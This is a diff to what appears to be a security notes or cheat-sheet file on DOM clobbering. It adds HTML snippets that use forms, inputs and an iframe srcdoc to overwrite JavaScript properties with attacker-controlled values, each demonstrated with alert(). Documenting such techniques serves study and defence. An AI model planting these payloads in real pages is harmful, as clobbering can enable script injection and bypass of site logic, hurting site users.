@@ -104,7 +104,7 @@ object
   console.log(x) //controlled string
 </script>
 ```
-- CLobbering an array and attributes-:
+- Clobbering an array and attributes-:
 
 ```html
 <a id=x>
@@ -112,7 +112,26 @@ object
   </a>
 </a>
 ```
-- Use a form to clobber 3 attributes
+- Use a form to clobber 3 attributes-:
+
+```html
+<form id="x" name="y"><input id="z" value="controlled" /></form>
+<form id="x"></form>
+<script>
+  alert(x.y.z.value) //controlled
+</script>
+```
+- Clobbering attributes with `iframe`
+
+```html
+<iframe name="x" srcdoc="<a id=y href=controlled></a>"></iframe>
+<style>
+  @import "https://google.com";
+</style>
+<script>
+  alert(x.y) //controlled
+</script>
+```
 
 ---------------
 
